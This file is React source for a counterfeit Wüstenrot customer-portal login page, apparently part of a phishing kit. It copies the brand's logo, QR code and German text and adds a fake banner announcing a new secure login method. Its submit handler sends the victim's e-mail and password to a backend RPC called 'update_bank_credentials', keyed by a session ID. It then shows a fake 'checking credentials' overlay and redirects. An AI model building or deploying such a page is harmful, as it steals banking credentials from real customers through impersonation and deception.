import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { AlertTriangle, X, Eye, EyeOff, Smartphone } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import wuestenrotLogo from "@/assets/wuestenrot-logo.svg";
import wuestenrotIcon from "@/assets/wuestenrot-icon.png";
import wuestenrotQr from "@/assets/wuestenrot-qr.png";
import appStore from "@/assets/app-store.svg";
import googlePlay from "@/assets/google-play.svg";

const Wuestenrot = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showAlert, setShowAlert] = useState(true);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Wüstenrot - Login", wuestenrotIcon);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: email,
        p_password: password,
        p_username_label: "E-Mail-Adresse",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen grid grid-cols-1 md:grid-cols-[60%_40%]" style={{ fontFamily: "'Open Sans', sans-serif" }}>
        {/* Linke Spalte */}
        <div className="bg-white px-6 py-8 md:px-16 md:py-12 flex flex-col">
          {/* Logo */}
          <div className="mb-12 flex items-center gap-3">
            <img src={wuestenrotLogo} alt="Wüstenrot" className="h-8" />
          </div>

          {/* Hinweisbox */}
          {showAlert && (
            <div className="mb-8 flex items-stretch gap-3 rounded-md border border-[#fde68a] bg-[#fef3c7] px-4 py-3">
              <div className="flex items-center">
                <AlertTriangle className="h-10 w-10 text-[#92400e]" strokeWidth={1.8} />
              </div>
              <div className="flex-1 flex items-center text-sm text-[#1a1a1a]">
                Ab sofort stellen wir auf eine neue Login-Methode mit zusätzlicher Sicherheitsstufe um.
              </div>
              <button onClick={() => setShowAlert(false)} className="self-start text-gray-700 hover:text-black">
                <X className="h-5 w-5" />
              </button>
            </div>
          )}

          {/* Headings */}
          <h1 className="text-2xl font-bold text-[#1a1a1a]">Willkommen im W&amp;W-Kundenportal</h1>
          <p className="mb-8 text-2xl font-bold text-[#1a1a1a]">Bitte melden Sie sich an.</p>

          {/* Email */}
          <label className="mb-1 block text-sm text-[#1a1a1a]">E-Mail-Adresse</label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="mb-5 h-11 w-full rounded-md border border-gray-400 px-3 text-sm outline-none focus:border-gray-700"
          />

          {/* Password */}
          <label className="mb-1 block text-sm text-[#1a1a1a]">Passwort</label>
          <div className="relative mb-2">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-11 w-full rounded-md border border-gray-400 px-3 pr-10 text-sm outline-none focus:border-gray-700"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600"
            >
              {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
            </button>
          </div>

          <a href="#" className="mb-6 inline-block text-sm text-[#1a1a1a] underline w-fit">Passwort vergessen?</a>

          {/* Anmelden Button */}
          <button
            onClick={handleSubmit}
            className="mb-6 w-fit rounded-md px-8 py-3 text-sm font-bold text-white transition-opacity hover:opacity-90"
            style={{ backgroundColor: "#e03700" }}
          >
            Anmelden
          </button>

          <p className="text-sm text-[#1a1a1a]">
            Noch kein Benutzerkonto?{" "}
            <a href="#" className="font-bold" style={{ color: "#e03700" }}>Hier Registrieren</a>
          </p>

          {/* Footer */}
          <div className="mt-auto pt-12">
            <hr className="border-gray-200 mb-4" />
            <div className="flex flex-wrap gap-6 text-sm text-gray-700">
              <a href="#" className="hover:underline">Impressum</a>
              <a href="#" className="hover:underline">Datenschutz</a>
              <a href="#" className="hover:underline">Hilfeseite</a>
            </div>
          </div>
        </div>

        {/* Rechte Spalte */}
        <div className="px-6 py-8 md:px-12 md:py-12" style={{ backgroundColor: "#f0f0f0" }}>
          {/* QR Card */}
          <div className="rounded-md bg-white p-5 shadow-sm">
            <div className="grid grid-cols-2 gap-4 items-center">
              <div className="flex justify-center">
                <img src={wuestenrotQr} alt="QR Code" className="w-full max-w-[180px]" />
              </div>
              <div>
                <div className="mb-2 flex items-center gap-2">
                  <Smartphone className="h-5 w-5 text-[#1a1a1a]" />
                  <span className="font-bold text-[#1a1a1a]">App für Privatkunden</span>
                </div>
                <p className="text-sm text-[#1a1a1a]">Nicht für Firmenkunden nutzbar.</p>
                <p className="text-sm text-[#1a1a1a]">Bitte verwenden Sie den Webzugang.</p>
              </div>
            </div>
          </div>

          <div className="mt-6 space-y-4 text-sm text-[#1a1a1a]">
            <p className="font-bold">
              QR-Code mit der Telefonkamera scannen und unser Kundenportal als App verwenden.
            </p>
            <p>
              Ob per App oder im Browser: Unser mobiles Kundenportal ist Ihr persönlicher Vertrags- und Finanzassistent für unterwegs und zuhause.
            </p>
            <p className="font-bold">Schnell, unkompliziert und intuitiv.</p>
          </div>

          <div className="mt-6 flex flex-wrap gap-3">
            <a href="#"><img src={appStore} alt="App Store" className="h-12" /></a>
            <a href="#"><img src={googlePlay} alt="Google Play" className="h-12" /></a>
          </div>
        </div>
      </div>
    </>
  );
};

export default Wuestenrot;
